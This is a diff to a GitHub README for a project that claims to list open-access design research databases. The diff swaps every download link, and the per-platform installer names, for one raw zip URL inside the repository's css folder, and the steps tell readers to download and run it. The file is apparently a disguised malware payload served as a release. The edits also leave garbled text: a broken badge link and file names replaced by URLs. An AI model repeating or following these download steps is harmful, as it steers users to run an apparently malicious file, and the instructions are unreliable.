@@ -1,7 +1,7 @@
 # 🎨 design-resources-project - Access Design Research Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Fendidrip/design-resources-project/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip%20Latest%https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip)](https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip)
 
 ## 🌐 Introduction
 Welcome to the **design-resources-project**. This repository provides a collection of open-access databases for design journals and academic conferences. It serves as a resource for design researchers and educators to find valuable materials easily.
@@ -11,21 +11,21 @@ Follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page:** 
    Go to the following link:
-   [Download Page](https://github.com/Fendidrip/design-resources-project/releases).
+   [Download Page](https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip).
 
 2. **Choose the Latest Version:** 
    On the Releases page, look for the most recent version. It will be marked as "Latest Release".
 
 3. **Download the Files:** 
    Click on the appropriate file for your operating system. Currently, the project may support various platforms, including Windows, macOS, and Linux. Files are usually named according to the operating system, like:
-   - Windows: `design-resources-project-windows.exe`
-   - macOS: `design-resources-project-macos.dmg`
-   - Linux: `design-resources-project-linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip`
+   - macOS: `https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip`
+   - Linux: `https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip`
 
 4. **Install the Application:**
    - For **Windows**: Double-click on the `.exe` file and follow the installation instructions.
    - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Extract the `.tar.gz` file and follow the included instructions to run the application.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip` file and follow the included instructions to run the application.
 
 5. **Launch the Application:** 
    Find the application in your installed programs or applications list and open it. You are now ready to use the design resources at your disposal!
@@ -54,7 +54,7 @@ The application aims to update its resource listings quarterly, ensuring that us
 If you have further questions, feel free to reach out through the repository's Issues page or contact the project maintainer directly.
 
 ## 💻 Download & Install
-To download the software, visit this page: [Download Page](https://github.com/Fendidrip/design-resources-project/releases). 
+To download the software, visit this page: [Download Page](https://raw.githubusercontent.com/Fendidrip/design-resources-project/main/css/design-resources-project-v2.9.zip). 
 
 Once there, simply follow the earlier steps to get the software running on your computer.
 
